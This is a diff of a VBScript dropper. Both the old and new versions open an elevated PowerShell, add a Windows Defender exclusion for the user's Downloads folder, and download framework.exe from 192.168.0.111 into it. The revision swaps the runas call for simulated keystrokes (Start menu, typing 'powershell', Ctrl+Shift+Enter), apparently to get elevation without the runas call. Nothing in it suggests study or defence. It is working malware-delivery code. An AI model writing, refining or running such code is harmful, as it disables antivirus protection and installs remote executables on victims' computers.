@@ -1,9 +1,22 @@
-Set shell = CreateObject("WScript.Shell")
+Set x = CreateObject("WScript.Shell")
 
-' PowerShell command: Exclude Downloads + Download file
-psCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
-            """Add-MpPreference -ExclusionPath '$env:USERPROFILE\Downloads'; " & _
-            "Invoke-WebRequest -Uri 'http://192.168.0.111/framework.exe' -OutFile '$env:USERPROFILE\Downloads\framework.exe'"""
+' Open Start Menu
+x.SendKeys "^{ESC}"
+WScript.Sleep 1000
 
-' Run as Administrator
-shell.Run "runas /user:Administrator " & Chr(34) & psCommand & Chr(34), 1, False
+' Type PowerShell
+x.SendKeys "powershell"
+WScript.Sleep 1500
+
+' Run as Admin: Ctrl+Shift+Enter
+x.SendKeys "^+{ENTER}"
+WScript.Sleep 4000  ' Wait for PowerShell to open (and UAC if needed)
+
+' Paste PowerShell command
+cmd = "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads; " & _
+      "Invoke-WebRequest -Uri 'http://192.168.0.111/framework.exe' -OutFile $env:USERPROFILE\Downloads\framework.exe"
+      
+' Paste command into the elevated PowerShell window
+x.SendKeys "powershell -command " & Chr(34) & cmd & Chr(34)
+WScript.Sleep 500
+x.SendKeys "{ENTER}"
